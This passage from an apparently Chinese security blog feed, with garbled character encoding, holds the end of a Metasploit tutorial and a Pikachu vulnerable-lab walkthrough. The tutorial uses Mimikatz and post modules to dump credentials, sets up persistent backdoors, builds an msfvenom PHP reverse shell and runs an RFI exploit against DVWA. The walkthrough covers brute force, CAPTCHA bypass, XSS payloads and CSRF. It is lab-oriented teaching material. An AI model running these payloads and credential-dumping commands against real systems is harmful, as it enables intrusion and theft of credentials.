æ‰«ææœ¬åœ°å¯ä»¥ç”¨äºææƒçš„æ¼æ´æ¨¡å—</span><br><span class="line">run post/windows/manage/delete_user USERNAME=a # åˆ é™¤ç”¨æˆ·</span><br><span class="line">run post/multi/gather/env # æŸ¥çœ‹ç³»ç»Ÿç¯å¢ƒä¿¡æ¯</span><br><span class="line">run post/multi/gather/firefox_creds # æŸ¥çœ‹ç«ç‹æµè§ˆå™¨ä¿å­˜çš„å¯†ç </span><br><span class="line">run post/multi/gather/ssh_creds # æŸ¥çœ‹æœ¬åœ°ä¿å­˜çš„sshç”¨æˆ·åå¯†ç ä¿¡æ¯</span><br><span class="line">run post/multi/gather/check_malware REMOTEFILE=c:\\a.exe # æ£€æŸ¥ç›®æ ‡ç³»ç»Ÿæ–‡ä»¶æ˜¯å¦ä¸ºæ¶æ„æ–‡ä»¶</span><br><span class="line">run hostsedit -e 192.168.1.4,www.baidu.com # ä¿®æ”¹hostsæ–‡ä»¶</span><br></pre></td></tr></table></figure>

<p>è®¾ç½®åˆ¶åŠ¨æ‰§è¡Œè„šæœ¬ï¼Œä½¿å¾—åˆ°çš„sessionè¿›ç¨‹ä¸ºexplorer</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msf5 exploit(multi/handler) &gt; set AutorunScript migrate -n explorer.exe</span><br><span class="line">run -j -z</span><br><span class="line"></span><br><span class="line">set InitialAutoRunScript migrate -n explorer.exe</span><br><span class="line">set AutoRunScript post/windows/gather/dumplinks</span><br></pre></td></tr></table></figure>

<h3 id="æ¡ˆä¾‹ä¹ï¼Œå»ºç«‹æŒä¹…è¿æ¥"><a href="#æ¡ˆä¾‹ä¹ï¼Œå»ºç«‹æŒä¹…è¿æ¥" class="headerlink" title="æ¡ˆä¾‹ä¹ï¼Œå»ºç«‹æŒä¹…è¿æ¥"></a>æ¡ˆä¾‹ä¹ï¼Œå»ºç«‹æŒä¹…è¿æ¥</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">run metsvc -A # åœ¨ç›®æ ‡æœºå™¨åˆ›å»ºä¸€ä¸ªç³»ç»ŸæœåŠ¡å¹¶å¯åŠ¨</span><br></pre></td></tr></table></figure>

<img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200709150301191.png" class>

<img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200709150337750.png" class>

<img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200709150449642.png" class>

<p>è¿æ¥</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/metsvc_bind_tcp</span><br><span class="line">set rhost  192.168.1.200</span><br><span class="line">set lport 31337</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p>å…¶ä»–æ–¹æ³•</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">run persistence -X -r 192.168.1.200 -p 4444 -i 10 # å½“XPé‡å¯æ—¶ä¼šé‡æ–°è¿æ¥</span><br></pre></td></tr></table></figure>

<p>é‡å¯XPç›´è¿</p>
<h3 id="æ¡ˆä¾‹åï¼ŒMSFå»¶å±•Mimikatz"><a href="#æ¡ˆä¾‹åï¼ŒMSFå»¶å±•Mimikatz" class="headerlink" title="æ¡ˆä¾‹åï¼ŒMSFå»¶å±•Mimikatz"></a>æ¡ˆä¾‹åï¼ŒMSFå»¶å±•Mimikatz</h3><p>hashdumpå°±æ˜¯ä½¿ç”¨mimikatzçš„éƒ¨åˆ†åŠŸèƒ½</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">å¯¼å…¥</span><br><span class="line">load mimikatz</span><br><span class="line">msv # æŸ¥çœ‹ç³»ç»Ÿç”¨æˆ·ä¿¡æ¯ï¼ˆhashï¼‰</span><br><span class="line">ssp # æŸ¥çœ‹ç”¨æˆ·æ˜æ–‡ä¿¡æ¯</span><br><span class="line">tspkg # ç¥¨æ®</span><br><span class="line">wdigest # å¯ä»¥æŸ¥çœ‹åˆ°å†…å­˜ä¸­å­˜åœ¨çš„ç”¨æˆ·åå¯†ç </span><br></pre></td></tr></table></figure>

<img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200709161910259.png" class>

<p>å‚æ•°</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">getsystem</span><br><span class="line">load mimikatz</span><br><span class="line">wdigest Ìµkerberos Ìµmsv Ìµssp Ìµtspkg Ìµlivessp</span><br><span class="line">mimikatz_command -h</span><br><span class="line">mimikatz_command -f a::  # æŸ¥çœ‹å“ªäº›æ¨¡å—å¯ä»¥ä½¿ç”¨</span><br><span class="line">mimikatz_command -f samdump::hashes  # </span><br><span class="line">mimikatz_command -f handle::list  # æŸ¥çœ‹ç³»ç»Ÿè¿›ç¨‹</span><br><span class="line">mimikatz_command -f service::list # æŸ¥çœ‹ç³»ç»ŸæœåŠ¡ï¼Œå¯ä»¥å¼€å¯æœåŠ¡ä¹Ÿå¯ä»¥åœæ­¢æœåŠ¡</span><br><span class="line">mimikatz_command -f crypto::listProviders  # æŸ¥çœ‹æ”¯æŒçš„åŠ å¯†å¥—ä»¶</span><br><span class="line">mimikatz_command -f winmine::infos # ç ´è§£æ‰«é›·æ¸¸æˆã€‚ã€‚ã€‚</span><br></pre></td></tr></table></figure>

<h3 id="æ¡ˆä¾‹åä¸€ï¼ŒPHP-shell"><a href="#æ¡ˆä¾‹åä¸€ï¼ŒPHP-shell" class="headerlink" title="æ¡ˆä¾‹åä¸€ï¼ŒPHP shell"></a>æ¡ˆä¾‹åä¸€ï¼ŒPHP shell</h3><p>é€šè¿‡æµè§ˆå™¨è®¿é—®æ‰§è¡Œphpæ–‡ä»¶æ‹¿åˆ°shell</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.4 LPORT=3333 -f</span><br><span class="line">raw -o a.php</span><br><span class="line"></span><br><span class="line">set payload php/meterpreter/reverse_tcp</span><br><span class="line">set lport 3333</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p>æµè§ˆå™¨è®¿é—®</p>
<img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200709165542747.png" class>

<p>getshell</p>
<img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200709165601746.png" class>

<h3 id="æ¡ˆä¾‹åäºŒï¼ŒRFI"><a href="#æ¡ˆä¾‹åäºŒï¼ŒRFI" class="headerlink" title="æ¡ˆä¾‹åäºŒï¼ŒRFI"></a>æ¡ˆä¾‹åäºŒï¼ŒRFI</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ä¿®æ”¹PHPé…ç½®æ–‡ä»¶ï¼Œå…è®¸è¿œç¨‹åŒ…å«</span><br><span class="line">vi /etc/php5/cgi/php.ini #php info é…ç½®æ–‡ä»¶</span><br><span class="line">allow_url_fopen = On</span><br><span class="line">allow_url_include = On</span><br><span class="line"></span><br><span class="line">MSFï¼š</span><br><span class="line">use exploit/unix/webapp/php_include</span><br><span class="line">set RHOST 192.168.1.5</span><br><span class="line">set PATH /dvwa/vulnerabilities/fi/</span><br><span class="line">set PHPURI /?page=XXpathXX  # ä¸ç®¡ä»€ä¹ˆéƒ½å¡«XXpathXX</span><br><span class="line">set HEADERS &quot;Cookie:security=low;PHPSESSID=r0p9hepkbrkcn01jjjqldsork2&quot;</span><br><span class="line">set payload php/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.1.4</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200711150428027.png" class>

]]></content>
      <categories>
        <category>kali</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>security tools</tag>
      </tags>
  </entry>
  <entry>
    <title>Pikachué¶æœº</title>
    <url>/2021/04/28/Pikachu/</url>
    <content><![CDATA[<h2 id="0x01-æš´åŠ›ç ´è§£"><a href="#0x01-æš´åŠ›ç ´è§£" class="headerlink" title="0x01.æš´åŠ›ç ´è§£"></a>0x01.æš´åŠ›ç ´è§£</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Burte Forceï¼ˆæš´åŠ›ç ´è§£ï¼‰æ¦‚è¿°</span><br><span class="line">â€œæš´åŠ›ç ´è§£â€æ˜¯ä¸€æ”»å‡»æ‰‹æ®µï¼Œåœ¨webæ”»å‡»ä¸­ï¼Œä¸€èˆ¬ä¼šä½¿ç”¨è¿™ç§æ‰‹æ®µå¯¹åº”ç”¨ç³»ç»Ÿçš„è®¤è¯ä¿¡æ¯è¿›è¡Œè·å–ã€‚ </span><br><span class="line">å…¶è¿‡ç¨‹å°±æ˜¯ä½¿ç”¨å¤§é‡çš„è®¤è¯ä¿¡æ¯åœ¨è®¤è¯æ¥å£è¿›è¡Œå°è¯•ç™»å½•ï¼Œç›´åˆ°å¾—åˆ°æ­£ç¡®çš„ç»“æœã€‚ </span><br><span class="line">ä¸ºäº†æé«˜æ•ˆç‡ï¼Œæš´åŠ›ç ´è§£ä¸€èˆ¬ä¼šä½¿ç”¨å¸¦æœ‰å­—å…¸çš„å·¥å…·æ¥è¿›è¡Œè‡ªåŠ¨åŒ–æ“ä½œã€‚</span><br><span class="line">ç†è®ºä¸Šæ¥è¯´ï¼Œå¤§å¤šæ•°ç³»ç»Ÿéƒ½æ˜¯å¯ä»¥è¢«æš´åŠ›ç ´è§£çš„ï¼Œåªè¦æ”»å‡»è€…æœ‰è¶³å¤Ÿå¼ºå¤§çš„è®¡ç®—èƒ½åŠ›å’Œæ—¶é—´ï¼Œæ‰€ä»¥æ–­å®šä¸€ä¸ªç³»ç»Ÿæ˜¯å¦å­˜åœ¨æš´åŠ›ç ´è§£æ¼æ´ï¼Œå…¶æ¡ä»¶ä¹Ÿä¸æ˜¯ç»å¯¹çš„ã€‚ </span><br><span class="line">æˆ‘ä»¬è¯´ä¸€ä¸ªwebåº”ç”¨ç³»ç»Ÿå­˜åœ¨æš´åŠ›ç ´è§£æ¼æ´ï¼Œä¸€èˆ¬æ˜¯æŒ‡è¯¥webåº”ç”¨ç³»ç»Ÿæ²¡æœ‰é‡‡ç”¨æˆ–è€…é‡‡ç”¨äº†æ¯”è¾ƒå¼±çš„è®¤è¯å®‰å…¨ç­–ç•¥ï¼Œå¯¼è‡´å…¶è¢«æš´åŠ›ç ´è§£çš„â€œå¯èƒ½æ€§â€å˜çš„æ¯”è¾ƒé«˜ã€‚ </span><br><span class="line">è¿™é‡Œçš„è®¤è¯å®‰å…¨ç­–ç•¥, åŒ…æ‹¬ï¼š</span><br><span class="line">1.æ˜¯å¦è¦æ±‚ç”¨æˆ·è®¾ç½®å¤æ‚çš„å¯†ç ï¼›</span><br><span class="line">2.æ˜¯å¦æ¯æ¬¡è®¤è¯éƒ½ä½¿ç”¨å®‰å…¨çš„éªŒè¯ç ï¼ˆæƒ³æƒ³ä½ ä¹°ç«è½¦ç¥¨æ—¶è¾“çš„éªŒè¯ç ï½ï¼‰æˆ–è€…æ‰‹æœºotpï¼›</span><br><span class="line">3.æ˜¯å¦å¯¹å°è¯•ç™»å½•çš„è¡Œä¸ºè¿›è¡Œåˆ¤æ–­å’Œé™åˆ¶ï¼ˆå¦‚ï¼šè¿ç»­5æ¬¡é”™è¯¯ç™»å½•ï¼Œè¿›è¡Œè´¦å·é”å®šæˆ–IPåœ°å€é”å®šç­‰ï¼‰ï¼›</span><br><span class="line">4.æ˜¯å¦é‡‡ç”¨äº†åŒå› ç´ è®¤è¯ï¼›</span><br></pre></td></tr></table></figure>

<a id="more"></a>

<h3 id="01-åŸºäºè¡¨å•çš„æš´åŠ›ç ´è§£"><a href="#01-åŸºäºè¡¨å•çš„æš´åŠ›ç ´è§£" class="headerlink" title="01.åŸºäºè¡¨å•çš„æš´åŠ›ç ´è§£"></a>01.åŸºäºè¡¨å•çš„æš´åŠ›ç ´è§£</h3><p><code>æ²¡æœ‰éªŒè¯ï¼Œç›´æ¥çˆ†ç ´</code></p>
<img src="/2021/04/28/Pikachu/image-20210426093055435.png" class>

<img src="/2021/04/28/Pikachu/image-20210426093144110.png" class>

<img src="/2021/04/28/Pikachu/image-20210426093156702.png" class>

<img src="/2021/04/28/Pikachu/image-20210426093250664.png" class>

<h3 id="02-éªŒè¯ç ç»•è¿‡-on-server"><a href="#02-éªŒè¯ç ç»•è¿‡-on-server" class="headerlink" title="02.éªŒè¯ç ç»•è¿‡(on server)"></a>02.éªŒè¯ç ç»•è¿‡(on server)</h3><p><code>å½“éªŒè¯ç è¾“å…¥æ­£ç¡®ã€ä¸ºç©ºå’Œè¾“å…¥é”™è¯¯ä¼šæ˜¯ä»¥ä¸‹3ç§æƒ…å†µï¼š</code></p>
<img src="/2021/04/28/Pikachu/image-20210426093447946.png" class>

<img src="/2021/04/28/Pikachu/image-20210426093726275.png" class>

<img src="/2021/04/28/Pikachu/image-20210426093751155.png" class>

<p><code>ç»•è¿‡çš„æ€è·¯å°±æ˜¯è§‚å¯ŸéªŒè¯ç ä¼šä¸æ˜¯è®¤è¯ä¸€æ¬¡å°±åˆ·æ–°</code></p>
<p><code>è¿™é‡Œæ›´æ”¹ç”¨æˆ·åå¯†ç ï¼Œä¸æ›´æ”¹éªŒè¯ç ï¼Œè¿”å›çš„ç»“æœå‡ä¸ºè´¦æˆ·å¯†ç é”™è¯¯ï¼Œå¯ä»¥å¾—å‡ºéªŒè¯ç ä¸æ˜¯è®¤è¯ä¸€æ¬¡åˆ·æ–°ä¸€æ¬¡</code></p>
<img src="/2021/04/28/Pikachu/image-20210426094235586.png" class>

<img src="/2021/04/28/Pikachu/image-20210426094442761.png" class>

<p><code>æ¥ä¸‹æ¥æŒ‰ç…§ä¸Šä¸€é¢˜è¿›è¡Œçˆ†ç ´å³å¯</code></p>
<h3 id="03-éªŒè¯ç ç»•è¿‡-on-client"><a href="#03-éªŒè¯ç ç»•è¿‡-on-client" class="headerlink" title="03.éªŒè¯ç ç»•è¿‡(on client)"></a>03.éªŒè¯ç ç»•è¿‡(on client)</h3><p><code>å‰ç«¯çš„éªŒè¯ç›´æ¥bpæŠ“åŒ…å³å¯ï¼ŒåŒä¸Š</code></p>
<img src="/2021/04/28/Pikachu/image-20210426095048409.png" class>

<h2 id="0x02-XSS"><a href="#0x02-XSS" class="headerlink" title="0x02.XSS"></a>0x02.XSS</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">XSSï¼ˆè·¨ç«™è„šæœ¬ï¼‰æ¦‚è¿°</span><br><span class="line">Cross-Site Scripting ç®€ç§°ä¸ºâ€œCSSâ€ï¼Œä¸ºé¿å…ä¸å‰ç«¯å æˆæ ·å¼è¡¨çš„ç¼©å†™&quot;CSS&quot;å†²çªï¼Œæ•…åˆç§°XSSã€‚</span><br><span class="line">ä¸€èˆ¬XSSå¯ä»¥åˆ†ä¸ºå¦‚ä¸‹å‡ ç§å¸¸è§ç±»å‹ï¼š</span><br><span class="line">    1.åå°„æ€§XSS;</span><br><span class="line">    2.å­˜å‚¨å‹XSS;</span><br><span class="line">    3.DOMå‹XSS;</span><br><span class="line"></span><br><span class="line">XSSæ¼æ´ä¸€ç›´è¢«è¯„ä¼°ä¸ºwebæ¼æ´ä¸­å±å®³è¾ƒå¤§çš„æ¼æ´ï¼Œåœ¨OWASP TOP10çš„æ’åä¸­ä¸€ç›´å±äºå‰ä¸‰çš„æ±Ÿæ¹–åœ°ä½ã€‚</span><br><span class="line">XSSæ˜¯ä¸€ç§å‘ç”Ÿåœ¨å‰ç«¯æµè§ˆå™¨ç«¯çš„æ¼æ´ï¼Œæ‰€ä»¥å…¶å±å®³çš„å¯¹è±¡ä¹Ÿæ˜¯å‰ç«¯ç”¨æˆ·ã€‚</span><br><span class="line">å½¢æˆXSSæ¼æ´çš„ä¸»è¦åŸå› æ˜¯ç¨‹åºå¯¹è¾“å…¥å’Œè¾“å‡ºæ²¡æœ‰åšåˆé€‚çš„å¤„ç†ï¼Œå¯¼è‡´â€œç²¾å¿ƒæ„é€ â€çš„å­—ç¬¦è¾“å‡ºåœ¨å‰ç«¯æ—¶è¢«æµè§ˆå™¨å½“ä½œæœ‰æ•ˆä»£ç è§£ææ‰§è¡Œä»è€Œäº§ç”Ÿå±å®³ã€‚</span><br><span class="line">å› æ­¤åœ¨XSSæ¼æ´çš„é˜²èŒƒä¸Šï¼Œä¸€èˆ¬ä¼šé‡‡ç”¨â€œå¯¹è¾“å…¥è¿›è¡Œè¿‡æ»¤â€å’Œâ€œè¾“å‡ºè¿›è¡Œè½¬ä¹‰â€çš„æ–¹å¼è¿›è¡Œå¤„ç†:</span><br><span class="line">  è¾“å…¥è¿‡æ»¤ï¼šå¯¹è¾“å…¥è¿›è¡Œè¿‡æ»¤ï¼Œä¸å…è®¸å¯èƒ½å¯¼è‡´XSSæ”»å‡»çš„å­—ç¬¦è¾“å…¥;</span><br><span class="line">  è¾“å‡ºè½¬ä¹‰ï¼šæ ¹æ®è¾“å‡ºç‚¹çš„ä½ç½®å¯¹è¾“å‡ºåˆ°å‰ç«¯çš„å†…å®¹è¿›è¡Œé€‚å½“è½¬ä¹‰;</span><br></pre></td></tr></table></figure>

<h3 id="01-åå°„å‹xss-get"><a href="#01-åå°„å‹xss-get" class="headerlink" title="01.åå°„å‹xss(get)"></a>01.åå°„å‹xss(get)</h3><p><code>æ²¡æœ‰è¿‡æ»¤ç›´æ¥æ‰“</code></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="regexp">/xss/</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h3 id="02-åå°„å‹xss-post"><a href="#02-åå°„å‹xss-post" class="headerlink" title="02.åå°„å‹xss(post)"></a>02.åå°„å‹xss(post)</h3><p><code>æ ¹æ®æç¤ºç™»å…¥ï¼Œç›´æ¥æ‰“</code></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="built_in">document</span>.cookie)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h3 id="03-å­˜å‚¨å‹xss"><a href="#03-å­˜å‚¨å‹xss" class="headerlink" title="03.å­˜å‚¨å‹xss"></a>03.å­˜å‚¨å‹xss</h3><p><code>æ²¡æœ‰è¿‡æ»¤ç›´æ¥æ‰“</code></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="built_in">document</span>.cookie)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h3 id="04-DOMå‹xss"><a href="#04-DOMå‹xss" class="headerlink" title="04.DOMå‹xss"></a>04.DOMå‹xss</h3><p><code>æµ‹è¯•å‘ç°è¾“å…¥çš„å†…å®¹åœ¨&lt;a&gt;æ ‡ç­¾ä¸­ï¼Œåªæœ‰é—­åˆaæ ‡ç­¾æ‰å¯ä»¥æ’å…¥ä»»æ„ä»£ç </code></p>
<img src="/2021/04/28/Pikachu/image-20210426102947841.png" class>

<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; onmouseover=&quot;alert(/xss/)&quot;&gt;</span></span><br></pre></td></tr></table></figure>

<img src="/2021/04/28/Pikachu/image-20210426104744355.png" class>

<h3 id="05-DOMå‹xss-x"><a href="#05-DOMå‹xss-x" class="headerlink" title="05.DOMå‹xss-x"></a>05.DOMå‹xss-x</h3><p><code>åŒä¸Š</code></p>
<img src="/2021/04/28/Pikachu/image-20210426125421138.png" class>

<h3 id="06-xss-ç›²æ‰“"><a href="#06-xss-ç›²æ‰“" class="headerlink" title="06.xss ç›²æ‰“"></a>06.xss ç›²æ‰“</h3><p><code>å‰å°è¾“å…¥æ•°æ®ä¸ä¼šæ˜¾ç¤ºç»“æœï¼Œåªæœ‰ç™»å…¥åˆ°åå°æ‰ä¼šçœ‹åˆ°</code></p>
<img src="/2021/04/28/Pikachu/image-20210426130043847.png" class>

<p><code>æ¯æ¬¡åˆ·æ–°éƒ½ä¼šå¼¹çª—</code></p>
<img src="/2021/04/28/Pikachu/image-20210426130139582.png" class>

<h3 id="07-xssè¿‡æ»¤"><a href="#07-xssè¿‡æ»¤" class="headerlink" title="07.xssè¿‡æ»¤"></a>07.xssè¿‡æ»¤</h3><p><code>è¿‡æ»¤äº†scriptï¼Œä½¿ç”¨å¤§å°å†™ç»•è¿‡å³å¯</code></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;SCRIPT&gt;alert(<span class="regexp">/xss/</span>)&lt;/SCRIPT&gt;</span><br></pre></td></tr></table></figure>

<img src="/2021/04/28/Pikachu/image-20210426131019115.png" class>

<h3 id="08-xssä¹‹htmlspecialchars"><a href="#08-xssä¹‹htmlspecialchars" class="headerlink" title="08.xssä¹‹htmlspecialchars"></a>08.xssä¹‹htmlspecialchars</h3><p><code>htmlspecialchars()å‡½æ•°å°†ç‰¹æ®Šå­—ç¬¦è½¬æ¢ä¸ºHTMLå®ä½“</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&amp; ï¼ˆå’Œå·ï¼‰æˆä¸º &amp;</span><br><span class="line">&quot; ï¼ˆåŒå¼•å·ï¼‰æˆä¸º &quot;</span><br><span class="line">&#39; ï¼ˆå•å¼•å·ï¼‰æˆä¸º &#39;</span><br><span class="line">&lt; ï¼ˆå°äºï¼‰æˆä¸º &lt;</span><br><span class="line">&gt; ï¼ˆå¤§äºï¼‰æˆä¸º &gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; onmouseover=&#x27;</span>alert(<span class="regexp">/xss/</span>)</span><br></pre></td></tr></table></figure>

<img src="/2021/04/28/Pikachu/image-20210426131739542.png" class>

<h3 id="09-xssä¹‹hreè¾“å‡º"><a href="#09-xssä¹‹hreè¾“å‡º" class="headerlink" title="09.xssä¹‹hreè¾“å‡º"></a>09.xssä¹‹hreè¾“å‡º</h3><p><code>ç‚¹å‡»è§¦å‘ä»£ç </code></p>
<img src="/2021/04/28/Pikachu/image-20210426132151201.png" class>

<h3 id="10-xssä¹‹jsè¾“å‡º"><a href="#10-xssä¹‹jsè¾“å‡º" class="headerlink" title="10.xssä¹‹jsè¾“å‡º"></a>10.xssä¹‹jsè¾“å‡º</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">demo&lt;<span class="regexp">/script&gt;&lt;script&gt;alert(/</span>xss/)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<img src="/2021/04/28/Pikachu/image-20210426133309084.png" class>

<h2 id="0x03-CSRF"><a href="#0x03-CSRF" class="headerlink" title="0x03.CSRF"></a>0x03.CSRF</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">CSRF(è·¨ç«™è¯·æ±‚ä¼ªé€ )æ¦‚è¿°</span><br><span class="line">Cross-site request forgery ç®€ç§°ä¸ºâ€œCSRFâ€ï¼Œ</span><br><span class="line">åœ¨CSRFçš„æ”»å‡»åœºæ™¯ä¸­æ”»å‡»è€…ä¼šä¼ªé€ ä¸€ä¸ªè¯·æ±‚ï¼ˆè¿™ä¸ªè¯·æ±‚ä¸€èˆ¬æ˜¯ä¸€ä¸ªé“¾æ¥ï¼‰ï¼Œ</span><br><span class="line">ç„¶åæ¬ºéª—ç›®æ ‡ç”¨æˆ·è¿›è¡Œç‚¹å‡»ï¼Œç”¨æˆ·ä¸€æ—¦ç‚¹å‡»äº†è¿™ä¸ªè¯·æ±‚ï¼Œæ•´ä¸ªæ”»å‡»å°±å®Œæˆäº†ã€‚</span><br><span class="line">æ‰€ä»¥CSRFæ”»å‡»ä¹Ÿæˆä¸º&quot;one click&quot;æ”»å‡»ã€‚ </span><br><span class="line">å¾ˆå¤šäººæä¸æ¸…æ¥šCSRFçš„æ¦‚å¿µï¼Œç”šè‡³æœ‰æ—¶å€™ä¼šå°†å…¶å’ŒXSSæ··æ·†,</span><br><span class="line">æ›´æœ‰ç”šè€…ä¼šå°†å…¶å’Œè¶Šæƒé—®é¢˜æ··ä¸ºä¸€è°ˆ,è¿™éƒ½æ˜¯å¯¹åŸç†æ²¡ææ¸…æ¥šå¯¼è‡´çš„ã€‚</span><br><span class="line">è¿™é‡Œåˆ—ä¸¾ä¸€ä¸ªåœºæ™¯è§£é‡Šä¸€ä¸‹ï¼Œå¸Œæœ›èƒ½å¤Ÿå¸®åŠ©ä½ ç†è§£ã€‚</span><br><span class="line">åœºæ™¯éœ€æ±‚ï¼š</span><br><span class="line">å°é»‘æƒ³è¦ä¿®æ”¹å¤§ç™½åœ¨è´­ç‰©ç½‘ç«™tianxiewww.xx.comä¸Šå¡«å†™çš„ä¼šå‘˜åœ°å€ã€‚</span><br><span class="line">å…ˆçœ‹ä¸‹å¤§ç™½æ˜¯å¦‚ä½•ä¿®æ”¹è‡ªå·±çš„å¯†ç çš„ï¼š</span><br><span class="line">ç™»å½•---ä¿®æ”¹ä¼šå‘˜ä¿¡æ¯ï¼Œæäº¤è¯·æ±‚---ä¿®æ”¹æˆåŠŸã€‚</span><br><span class="line">æ‰€ä»¥å°é»‘æƒ³è¦ä¿®æ”¹å¤§ç™½çš„ä¿¡æ¯ï¼Œä»–éœ€è¦æ‹¥æœ‰ï¼š1ï¼Œç™»å½•æƒé™ 2ï¼Œä¿®æ”¹ä¸ªäººä¿¡æ¯çš„è¯·æ±‚ã€‚</span><br><span class="line">ä½†æ˜¯å¤§ç™½åˆä¸ä¼šæŠŠè‡ªå·±xxxç½‘ç«™çš„è´¦å·å¯†ç å‘Šè¯‰å°é»‘ï¼Œé‚£å°é»‘æ€ä¹ˆåŠï¼Ÿ</span><br><span class="line">äºæ˜¯ä»–è‡ªå·±è·‘åˆ°www.xx.comä¸Šæ³¨å†Œäº†ä¸€ä¸ªè‡ªå·±çš„è´¦å·ï¼Œç„¶åä¿®æ”¹äº†ä¸€ä¸‹è‡ªå·±çš„ä¸ªäººä¿¡æ¯ï¼ˆæ¯”å¦‚ï¼šE-mailåœ°å€ï¼‰ï¼Œä»–å‘ç°ä¿®æ”¹çš„è¯·æ±‚æ˜¯ï¼š</span><br><span class="line">ã€http://www.xxx.com/edit.php?email=xiaohei@88.com&amp;Change=Changeã€‘</span><br><span class="line">äºæ˜¯ï¼Œä»–å®æ–½äº†è¿™æ ·ä¸€ä¸ªæ“ä½œï¼šæŠŠè¿™ä¸ªé“¾æ¥ä¼ªè£…ä¸€ä¸‹ï¼Œåœ¨å°ç™½ç™»å½•xxxç½‘ç«™åï¼Œæ¬ºéª—ä»–è¿›è¡Œç‚¹å‡»ï¼Œå°ç™½ç‚¹å‡»è¿™ä¸ªé“¾æ¥åï¼Œä¸ªäººä¿¡æ¯å°±è¢«ä¿®æ”¹äº†,å°é»‘å°±å®Œæˆäº†æ”»å‡»ç›®çš„ã€‚</span><br><span class="line">ä¸ºå•¥å°é»‘çš„æ“ä½œèƒ½å¤Ÿå®ç°å‘¢ã€‚æœ‰å¦‚ä¸‹å‡ ä¸ªå…³é”®ç‚¹ï¼š</span><br><span class="line">1.www.xxx.comè¿™ä¸ªç½‘ç«™åœ¨ç”¨æˆ·ä¿®æ”¹ä¸ªäººçš„ä¿¡æ¯æ—¶æ²¡æœ‰è¿‡å¤šçš„æ ¡éªŒï¼Œå¯¼è‡´è¿™ä¸ªè¯·æ±‚å®¹æ˜“è¢«ä¼ªé€ ;</span><br><span class="line">---å› æ­¤ï¼Œæˆ‘ä»¬åˆ¤æ–­ä¸€ä¸ªç½‘ç«™æ˜¯å¦å­˜åœ¨CSRFæ¼æ´ï¼Œå…¶å®å°±æ˜¯åˆ¤æ–­å…¶å¯¹å…³é”®ä¿¡æ¯ï¼ˆæ¯”å¦‚å¯†ç ç­‰æ•æ„Ÿä¿¡æ¯ï¼‰çš„æ“ä½œ(å¢åˆ æ”¹)æ˜¯å¦å®¹æ˜“è¢«ä¼ªé€ ã€‚</span><br><span class="line">2.å°ç™½ç‚¹å‡»äº†å°é»‘å‘ç»™çš„é“¾æ¥ï¼Œå¹¶ä¸”è¿™ä¸ªæ—¶å€™å°ç™½åˆšå¥½ç™»å½•åœ¨è´­ç‰©ç½‘ä¸Š;</span><br><span class="line">---å¦‚æœå°ç™½å®‰å…¨æ„è¯†é«˜ï¼Œä¸ç‚¹å‡»ä¸æ˜é“¾æ¥ï¼Œåˆ™æ”»å‡»ä¸ä¼šæˆåŠŸï¼Œåˆæˆ–è€…å³ä½¿å°ç™½ç‚¹å‡»äº†é“¾æ¥ï¼Œä½†å°ç™½æ­¤æ—¶å¹¶æ²¡æœ‰ç™»å½•è´­ç‰©ç½‘ç«™ï¼Œä¹Ÿä¸ä¼šæˆåŠŸã€‚</span><br><span class="line">---å› æ­¤ï¼Œè¦æˆåŠŸå®æ–½ä¸€æ¬¡CSRFæ”»å‡»ï¼Œéœ€è¦â€œå¤©æ—¶ï¼Œåœ°åˆ©ï¼Œäººå’Œâ€çš„æ¡ä»¶ã€‚</span><br><span class="line">å½“ç„¶ï¼Œå¦‚æœå°é»‘äº‹å…ˆåœ¨xxxç½‘çš„é¦–é¡µå¦‚æœå‘ç°äº†ä¸€ä¸ªXSSæ¼æ´ï¼Œåˆ™å°é»‘å¯èƒ½ä¼šè¿™æ ·åšï¼š 